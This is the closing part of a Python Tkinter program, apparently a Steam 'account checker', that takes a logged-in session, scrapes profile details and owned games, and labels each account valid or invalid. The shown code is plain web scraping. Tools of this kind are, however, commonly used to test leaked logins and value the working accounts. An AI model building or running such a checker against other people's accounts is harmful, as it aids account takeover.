            headers = {"User-Agent": self.UserAgent}
            
            self.log_response("📋 جلب معلومات الملف الشخصي", "DEBUG")
            
            response = self.session.get(
                f"https://steamcommunity.com/profiles/{self.steamid}/?xml=1", 
                headers=headers,
                timeout=self.timeout
            )
            
            self.log_response(f"📥 استجابة معلومات الملف - Status: {response.status_code}", "RESPONSE")
            
            profile_data = response.text
            
            info = {
                "steamid": self.steamid,
                "username": "Unknown",
                "country": "Unknown",
                "state": "Unknown",
                "profile_url": f"https://steamcommunity.com/profiles/{self.steamid}/"
            }
            
            username_match = re.search(r'<steamID><!\[CDATA\[(.*?)\]\]></steamID>', profile_data)
            if username_match:
                info["username"] = username_match.group(1)
            
            country_match = re.search(r'<location><!\[CDATA\[(.*?)\]\]></location>', profile_data)
            if country_match:
                info["country"] = country_match.group(1)
            
            state_match = re.search(r'<state><!\[CDATA\[(.*?)\]\]></state>', profile_data)
            if state_match:
                info["state"] = state_match.group(1)
            
            self.log_response(f"📊 معلومات الملف: {info}", "DEBUG")
            return info
            
        except Exception as e:
            self.log_response(f"💥 استثناء في جلب معلومات الملف: {e}", "ERROR")
            return None
    
    def get_games_info(self):
        if not self.vaild:
            return {"country": "Unknown", "total": 0, "games": []}
            
        try:
            headers = {
                "User-Agent": self.UserAgent,
                "Referer": f"https://steamcommunity.com/profiles/{self.steamid}/games/"
            }
            
            self.log_response("🎮 جلب معلومات الألعاب", "DEBUG")
            
            response = self.session.get(
                f"https://steamcommunity.com/profiles/{self.steamid}/games/?tab=all",
                headers=headers, 
                timeout=self.timeout
            )
            
            self.log_response(f"📥 استجابة معلومات الألعاب - Status: {response.status_code}", "RESPONSE")
            
            data = html.unescape(response.text)
            
            country = "Unknown"
            country_patterns = [
                r'"country":"([^"]*)"',
                r'<country><!\[CDATA\[(.*?)\]\]></country>',
            ]
            
            for pattern in country_patterns:
                match = re.search(pattern, data)
                if match:
                    country = match.group(1)
                    break
            
            games = []
            games_patterns = [
                r'"appid":(\d+),"name":"([^"]*)"',
                r'<game><appID>(\d+)</appID><name><!\[CDATA\[(.*?)\]\]></name></game>'
            ]
            
            for pattern in games_patterns:
                games_data = re.findall(pattern, data)
                if games_data:
                    games = [game[1] for game in games_data]
                    break
            
            result = {
                "country": country,
                "total": len(games),
                "games": games[:10]
            }
            
            self.log_response(f"🎯 معلومات الألعاب: {len(games)} لعبة", "DEBUG")
            self.log_response(f"🌍 البلد: {country}", "DEBUG")
            
            return result
            
        except Exception as e:
            self.log_response(f"💥 استثناء في جلب معلومات الألعاب: {e}", "ERROR")
            return {"country": "Unknown", "total": 0, "games": []}
    
    def check_account_status(self):
        if not self.vaild:
            return {"status": "invalid", "message": "Not logged in"}
        
        try:
            self.log_response("🔍 فحص حالة الحساب بشكل شامل", "INFO")
            
            if not self.is_valid():
                return {"status": "invalid", "message": "Session expired"}
            
            profile_info = self.get_profile_info()
            if not profile_info:
                return {"status": "error", "message": "Failed to get profile info"}
            
            games_info = self.get_games_info()
            
            result = {
                "status": "valid",
                "profile": profile_info,
                "games": games_info,
            }
            
            self.log_response("✅ فحص الحساب مكتمل بنجاح", "SUCCESS")
            return result
            
        except Exception as e:
            self.log_response(f"💥 استثناء في فحص حالة الحساب: {e}", "ERROR")
            return {"status": "error", "message": f"Check failed: {str(e)}"}
    
    def close(self):
        self.session.close()
        self.log_response("🔚 تم إغلاق الجلسة", "INFO")

if __name__ == "__main__":
    root = tk.Tk()
    app = ProfessionalSteamChecker(root)
    
    # تنسيق الألوان للشجرة
    style = ttk.Style()
    style.configure("Treeview", background="#34495e", fieldbackground="#34495e", foreground="white")
    style.configure("Treeview.Heading", background="#2c3e50", foreground="white", font=('Arial', 9, 'bold'))
    
    style.map('Treeview', background=[('selected', '#3498db')])
    
    root.mainloop()